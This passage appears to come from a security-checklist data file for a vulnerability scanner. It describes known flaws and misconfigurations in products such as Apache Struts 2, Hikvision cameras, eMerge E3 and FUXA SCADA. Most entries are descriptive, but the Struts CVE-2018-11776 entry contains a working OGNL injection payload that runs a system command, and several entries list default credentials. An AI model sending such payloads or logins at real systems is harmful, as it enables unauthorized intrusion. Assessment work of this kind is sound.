CVE-2023-0669 allows unauthenticated RCE in GoAnywhere MFT via a pre-authentication deserialization flaw — exploited by the Clop ransomware group to steal data from 130+ organizations.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-0669

---

## Wing FTP Server
<!-- id: wing-ftp | icon: 🛠️ | color: #e06c75 -->
Security checklists for Wing FTP Server.

### Check Wing FTP for weak admin credentials and Lua-based RCE
<!-- id: wing-ftp-1 | severity: critical | tags: wing-ftp, brute-force, lua-rce, admin -->
Wing FTP Server admin interface with weak credentials allows Lua script execution, enabling arbitrary command execution on the underlying OS.

**References:**
- https://www.exploit-db.com/search?q=wing+ftp

---

## PowerJob
<!-- id: powerjob | icon: 🛠️ | color: #e06c75 -->
Security checklists for PowerJob distributed job scheduling framework.

### Check PowerJob for unauthenticated access to job management console
<!-- id: powerjob-1 | severity: high | tags: powerjob, unauthorized-access, job-execution -->
PowerJob console without authentication allows listing all jobs, triggering execution, and modifying job parameters — potentially enabling OS command execution via shell script jobs.

**References:**
- https://github.com/PowerJob/PowerJob/security/advisories

---

## SuiteCRM
<!-- id: suitecrm | icon: 🛠️ | color: #e06c75 -->
Security checklists for SuiteCRM open-source CRM platform.

### Check SuiteCRM for PHP injection RCE (CVE-2023-35840)
<!-- id: suitecrm-1 | severity: critical | tags: suitecrm, rce, php-injection, cve -->
CVE-2023-35840 and related vulnerabilities allow authenticated users to achieve RCE via PHP file injection in the SuiteCRM Reports and Files modules.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-35840

---

## Apache Struts 2
<!-- id: struts2 | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache Struts 2 Java web framework.

### Check Struts 2 for OGNL injection RCE (CVE-2017-5638 — Equifax breach)
<!-- id: struts2-1 | severity: critical | tags: struts2, ognl, rce, cve -->
CVE-2017-5638 allows unauthenticated RCE via OGNL injection in the Content-Type header — exploited in the Equifax breach affecting 147 million people. Many other Struts OGNL CVEs exist.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5638

### CVE-2018-11776 — OGNL injection RCE (no Content-Type required) — Critical
<!-- id: struts2-cve-2018-11776 | severity: critical | tags: struts2, cve, rce, ognl -->
Vulnerable: Struts 2.3.x before 2.3.35, 2.5.x before 2.5.17. OGNL expression injection via the URL when namespace is not defined in struts config. No Content-Type header manipulation needed. Triggers via alwaysSelectFullNamespace=true configuration.

**Commands:**
```
curl 'https://target.com/${7*7}/index.action'
curl 'https://target.com/${"test".class.forName("java.lang.Runtime").getDeclaredMethod("exec","test".class).invoke("test".class.forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}/index.action'
```

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-11776

### CVE-2023-50164 — Path traversal file upload enabling RCE (Critical, CVSS 9.8)
<!-- id: struts2-cve-2023-50164 | severity: critical | tags: struts2, cve, rce, path-traversal, file-upload -->
Vulnerable: Struts 2.0.0–2.5.32, 6.0.0–6.3.0. The file upload logic allows path traversal via parameter manipulation, enabling an attacker to upload malicious files outside the intended upload directory, leading to RCE. Upgrade to 2.5.33+ or 6.3.0.2+.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-50164

---

## Hikvision / Dahua IP Cameras
<!-- id: ip-cameras | icon: 🛠️ | color: #e06c75 -->
Security checklists for Hikvision and Dahua IP cameras, DVRs, and NVRs.

### Check IP cameras for default credentials and exposed live feeds
<!-- id: ipcam-1 | severity: critical | tags: hikvision, dahua, default-creds, iot, rtsp -->
IP cameras with default credentials (admin/admin, admin/12345) expose live video, motion history, and RTSP streams — enabling physical security bypass and surveillance.

**References:**
- https://www.cvedetails.com/vendor/16870/Hikvision.html

### Check Hikvision for unauthenticated command injection RCE (CVE-2021-36260)
<!-- id: ipcam-2 | severity: critical | tags: hikvision, rce, command-injection, cve -->
CVE-2021-36260 allows unauthenticated command injection in Hikvision cameras via /SDK/webLanguage — exploited by Mirai botnets and nation-state espionage actors.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-36260

---

## eMerge E3 Access Control
<!-- id: emerge-e3 | icon: 🛠️ | color: #e06c75 -->
Security checklists for Linear eMerge E3 physical access control system.

### Check eMerge E3 for unauthenticated OS command injection (CVE-2019-7256)
<!-- id: emerge-1 | severity: critical | tags: emerge-e3, command-injection, rce, access-control, cve -->
CVE-2019-7256 allows unauthenticated OS command injection in the Linear eMerge E3 access control system — enabling door unlock and physical facility intrusion.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-7256

---

## Chamilo LMS
<!-- id: chamilo | icon: 🛠️ | color: #e06c75 -->
Security checklists for Chamilo open-source learning management system.

### Check Chamilo for unauthenticated file upload RCE (CVE-2023-4220)
<!-- id: chamilo-1 | severity: critical | tags: chamilo, file-upload, rce, cve -->
CVE-2023-4220 allows unauthenticated file upload in Chamilo LMS via the bigupload endpoint, enabling webshell deployment and Remote Code Execution.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-4220

---

## Lucee
<!-- id: lucee | icon: 🛠️ | color: #e06c75 -->
Security checklists for Lucee CFML application server.

### Check Lucee for exposed admin console with empty or default credentials
<!-- id: lucee-1 | severity: critical | tags: lucee, admin, default-creds, rce -->
Lucee admin consoles with empty or default credentials allow deploying CFML code directly, enabling arbitrary OS command execution on the server.

**References:**
- https://docs.lucee.org/guides/running-lucee/securing-lucee-server.html

---

## Sidekiq
<!-- id: sidekiq | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sidekiq Ruby background job processing framework.

### Check Sidekiq Web UI for unauthenticated access
<!-- id: sidekiq-1 | severity: high | tags: sidekiq, web-ui, unauthorized-access, job-manipulation -->
Sidekiq Web UI without authentication exposes all background job queues, allows retrying/clearing jobs, and reveals job argument data potentially containing secrets or PII.

**References:**
- https://github.com/sidekiq/sidekiq/wiki/Monitoring#web-ui

---

## Altenergy Power Control
<!-- id: altenergy | icon: 🛠️ | color: #e06c75 -->
Security checklists for Altenergy Power Control Software for solar inverters.

### Check Altenergy for unauthenticated OS command injection (CVE-2023-28343)
<!-- id: altenergy-1 | severity: critical | tags: altenergy, command-injection, rce, ics, cve -->
CVE-2023-28343 allows unauthenticated OS command injection in Altenergy Power Control Software — affecting renewable energy ICS infrastructure.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-28343

---

## Expedition (Palo Alto Networks)
<!-- id: expedition | icon: 🛠️ | color: #e06c75 -->
Security checklists for Palo Alto Networks Expedition migration and security assessment tool.

### Check Expedition for SQL injection and credential exposure (CVE-2024-9463)
<!-- id: expedition-1 | severity: critical | tags: expedition, sqli, credential-exposure, cve -->
CVE-2024-9463 allows unauthenticated SQL injection in Palo Alto Expedition, exposing firewall usernames, cleartext passwords, device configurations, and API keys.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-9463

---

## FUXA SCADA
<!-- id: fuxa | icon: 🛠️ | color: #e06c75 -->
Security checklists for FUXA web-based SCADA and process visualization platform.

### Check FUXA for unauthenticated access to industrial process controls
<!-- id: fuxa-1 | severity: critical | tags: fuxa, scada, ics, unauthorized-access -->
FUXA without authentication exposes all industrial process controls, enabling unauthorized manipulation of connected PLCs, sensors, and actuators.

**References:**
- https://github.com/frangoteam/FUXA/security/advisories

---

## MeterSphere
<!-- id: metersphere | icon: 🛠️ | color: #e06c75 -->
Security checklists for MeterSphere open-source continuous testing platform.

### Check MeterSphere for SQL injection and arbitrary file read (CVE-2023-36457)
<!-- id: metersphere-1 | severity: critical | tags: metersphere, sqli, file-read, cve -->
Multiple MeterSphere versions contain SQL injection and arbitrary file read in API testing endpoints, allowing full database extraction and server file access.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-36457

---

## Bonita BPM
<!-- id: bonita | icon: 🛠️ | color: #e06c75 -->
Security checklists for Bonitasoft open-source business process management platform.

### Check Bonita for authentication bypass and RCE (CVE-2022-25237)
<!-- id: bonita-1 | severity: critical | tags: bonita, auth-bypass, rce, cve -->
CVE-2022-25237 allows authentication bypass in Bonita Platform leading to RCE via restricted REST API access.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-25237

---

## erxes
<!-- id: erxes | icon: 🛠️ | color: #e06c75 -->
Security checklists for erxes open-source CRM and growth hacking platform.

### Check erxes for unauthenticated GraphQL mutation abuse
<!-- id: erxes-1 | severity: high | tags: erxes, graphql, unauthorized-access, data-exposure -->
erxes GraphQL API may expose mutations for admin user creation or full customer data access when authentication and authorization are misconfigured.

**References:**
- https://github.com/erxes/erxes/security/advisories

---

## HugeGraph
<!-- id: hugegraph | icon: 🛠️ | color: #e06c75 -->
Security checklists for Apache HugeGraph graph database.

### Check HugeGraph for unauthenticated RCE via Gremlin API (CVE-2024-27348)
<!-- id: hugegraph-1 | severity: critical | tags: hugegraph, rce, gremlin, unauthorized-access, cve -->
CVE-2024-27348 allows unauthenticated RCE in Apache HugeGraph Server via the Gremlin API endpoint — actively exploited by threat actors.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-27348

---

## SpiderFlow
<!-- id: spiderflow | icon: 🛠️ | color: #e06c75 -->
Security checklists for SpiderFlow open-source visual web crawling and RPA platform.

### Check SpiderFlow for unauthenticated RCE via Groovy/JS script execution
<!-- id: spiderflow-1 | severity: critical | tags: spiderflow, rce, script-execution, unauthorized-access -->
SpiderFlow allows defining custom Groovy/JS scripts in crawl pipelines. Unauthenticated or weakly authenticated access enables arbitrary code execution on the hosting server.

**References:**
- https://github.com/ssssssss-team/spider-flow/security/advisories

---

## Netdisco
<!-- id: netdisco | icon: 🛠️ | color: #e06c75 -->
Security checklists for Netdisco open-source network management tool.

### Check Netdisco for exposed network topology and SNMP credentials
<!-- id: netdisco-1 | severity: high | tags: netdisco, info-disclosure, network-topology, snmp-credentials -->
Netdisco without authentication exposes complete network topology, device inventories, MAC address tables, and SNMP community strings.

**References:**
- https://netdisco.org/

---

## InvoiceShelf
<!-- id: invoiceshelf | icon: 🛠️ | color: #e06c75 -->
Security checklists for InvoiceShelf open-source invoicing platform.

### Check InvoiceShelf for exposed installation wizard
<!-- id: invoiceshelf-1 | severity: critical | tags: invoiceshelf, install, unauthorized-access -->
InvoiceShelf installation wizard left accessible allows database reset and admin credential creation, granting full access to all invoices and client data.

**References:**
- https://github.com/InvoiceShelf/InvoiceShelf/security/advisories

---

## NetAlertX
<!-- id: netalertx | icon: 🛠️ | color: #e06c75 -->
Security checklists for NetAlertX network monitoring and intrusion detection.

### Check NetAlertX for unauthenticated access and network topology exposure
<!-- id: netalertx-1 | severity: medium | tags: netalertx, unauthorized-access, network-monitoring -->
NetAlertX without authentication exposes all discovered network devices, MAC addresses, and historical connection data to unauthenticated visitors.

**References:**
- https://github.com/jokob-sk/NetAlertX/security/advisories

---

## Repetier-Server
<!-- id: repetier | icon: 🛠️ | color: #e06c75 -->
Security checklists for Repetier-Server 3D printer management platform.

### Check Repetier-Server for unauthenticated access and printer control
<!-- id: repetier-1 | severity: high | tags: repetier, 3d-printer, unauthorized-access, iot -->
Repetier-Server without authentication allows remotely controlling all connected 3D printers — enabling physical damage by running arbitrary G-code commands.

**References:**
- https://www.repetier-server.com/documentation/

---

## Unisphere (Dell EMC)
<!-- id: unisphere | icon: 🛠️ | color: #e06c75 -->
Security checklists for Dell EMC Unisphere storage management platform.

### Check Unisphere for authentication bypass and data exposure (CVE-2020-5377)
<!-- id: unisphere-1 | severity: critical | tags: unisphere, auth-bypass, data-exposure, cve -->
CVE-2020-5377 allows unauthenticated access to sensitive Dell EMC Unisphere for PowerMax data via REST API — exposing storage configuration and credentials.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-5377

---

## Camaleon CMS
<!-- id: camaleon-cms | icon: 🛠️ | color: #e06c75 -->
Security checklists for Camaleon CMS Ruby on Rails content management system.

### Check Camaleon CMS for SSRF and local file read via image upload (CVE-2024-46986)
<!-- id: camaleon-1 | severity: high | tags: camaleon-cms, ssrf, file-read, cve -->
CVE-2024-46986 allows authenticated Camaleon CMS users to perform SSRF and read local files via the image upload feature, exposing cloud credentials and internal services.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-46986

---

## Emby / Jellyfin
<!-- id: emby | icon: 🛠️ | color: #e06c75 -->
Security checklists for Emby and Jellyfin media server platforms.

### Check Emby/Jellyfin for unauthenticated API access and media exposure
<!-- id: emby-1 | severity: medium | tags: emby, jellyfin, unauthorized-access, media-exposure -->
Emby and Jellyfin instances without authentication expose all media libraries, user credentials, and playback activity logs to unauthenticated visitors.

**References:**
- https://emby.media/security.html

---

## Gotify
<!-- id: gotify | icon: 🛠️ | color: #e06c75 -->
Security checklists for Gotify self-hosted push notification server.

### Check Gotify for default credentials enabling notification interception
<!-- id: gotify-1 | severity: high | tags: gotify, admin, default-creds, notification-interception -->
Gotify with default credentials (admin/admin) allows reading all push notifications — potentially intercepting OTP codes, security alerts, and internal monitoring messages.

**References:**
- https://gotify.net/docs/config

---

## Kavita
<!-- id: kavita | icon: 🛠️ | color: #e06c75 -->
Security checklists for Kavita open-source reading server.

### Check Kavita for unauthenticated library access
<!-- id: kavita-1 | severity: medium | tags: kavita, unauthorized-access, media-exposure -->
Kavita without authentication allows browsing and downloading all library content — including any sensitive documents stored alongside comics and ebooks.

**References:**
- https://wiki.kavitareader.com/en/guides/configuring-kavita/security

---

## GestSup
<!-- id: gestsup | icon: 🛠️ | color: #e06c75 -->
Security checklists for GestSup open-source helpdesk and IT asset management.

### Check GestSup for SQL injection and unauthenticated ticket access
<!-- id: gestsup-1 | severity: high | tags: gestsup, sqli, unauthorized-access -->
GestSup without proper access controls exposes all support tickets, IT asset inventory, and user credentials via SQL injection in search parameters.

**References:**
- https://gestsup.fr/

---

## Sangfor SSL VPN
<!-- id: sangfor | icon: 🛠️ | color: #e06c75 -->
Security checklists for Sangfor SSL VPN appliance.

### Check Sangfor SSL VPN for pre-auth RCE (CVE-2019-17414)
<!-- id: sangfor-1 | severity: critical | tags: sangfor, ssl-vpn, rce, cve -->
CVE-2019-17414 allows unauthenticated RCE on Sangfor SSL VPN appliances — exploited by ransomware groups targeting organizations using this VPN solution.

**References:**
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17414

---
